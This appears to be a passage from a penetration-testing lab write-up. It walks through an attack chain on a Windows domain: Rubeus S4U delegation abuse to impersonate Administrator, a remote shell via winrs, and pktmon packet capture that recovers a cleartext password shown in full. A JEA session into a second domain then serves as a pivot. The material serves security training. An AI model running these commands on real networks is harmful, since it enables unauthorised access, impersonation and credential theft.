```powershell
# FROM IT-EMPLOYEE15 (RBCD)
.\Rubeus.exe s4u /user:it-attack01$ /rc4:REDACTED_SECRET /msdsspn:HTTP/it-track01.it.gcb.example /impersonateuser:Administrator /ptt

winrs.exe -r:it-track01.it.gcb.example cmd
```

> The `Administrator.IT` profile directory corresponds to the domain user `IT\Administrator`. Because a local `Administrator` profile already exists on the system, Windows appends the `.IT` suffix (the domain NetBIOS name) to distinguish the domain account profile — access here is limited to local administrator on this host.

## ATTACK CHAIN

`Host (port 80/TCP)` → exposed web service → web enumeration (browsing, headers, endpoints) → traffic analysis (sniffing / MITM) → cleartext credentials recovered → authenticated access to service → JEA endpoint abuse → pivot to `10.200.10.14 ~ FINANCE-VANESSA`

## EXPLOITATION

During host enumeration, port 80/TCP (HTTP) was found active, indicating an accessible web service that may transmit credentials or artifacts in cleartext.

#### 1. Service Enumeration

```powershell
netstat -an | select-string LISTEN
# TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
```

#### 2. HTTP Traffic Capture (Network Sniffing)

Since the web service runs over HTTP, credentials may be transmitted in cleartext. With administrative privileges on the host, traffic capture is performed at the system level using `pktmon`, which captures packets independently of the authenticated user identity.

```powershell
# Remove all configured pktmon filters
pktmon filter remove 

# Start packet capture using ETW (Event Tracing for Windows)
pktmon start --etw

# Stop capture
pktmon stop

# Convert the ETL file to PCAPNG for analysis in Wireshark
pktmon pcapng PktMon.etl -o log.pcapng
```

Cleartext credentials were recovered from captured HTTP traffic:

```powershell
username = finance\vanessa
password = 300YearsAndStillG0ing$trong
```

> Wireshark filter used: `ip.dst == 10.200.10.14`

#### 3. New Domain Identified

The credential format (`finance\vanessa`) indicates an additional domain within the infrastructure, identified as `gcbfinance.example`. This confirms a multi-domain environment and opens lateral movement paths between domains.

#### 4. Active Directory Impact

Enumeration of `gcbfinance.example` identified a host named `finance-vanessa` exposing a PowerShell Just Enough Administration (JEA) endpoint named `IT-ACCESS`. With valid credentials for `finance\vanessa`, access to this endpoint was tested for potential abuse vectors.

#### 5. Remote Connection

```powershell
$session=New-PSSession -ComputerName finance-vanessa.gcbfinance.example -Credential finance\vanessa -ConfigurationName ITAccess
```

This establishes a restricted remote session under the context of `finance\vanessa`, enabling enumeration of allowed JEA cmdlets and evaluation of potential escalation paths within `gcbfinance.example`.
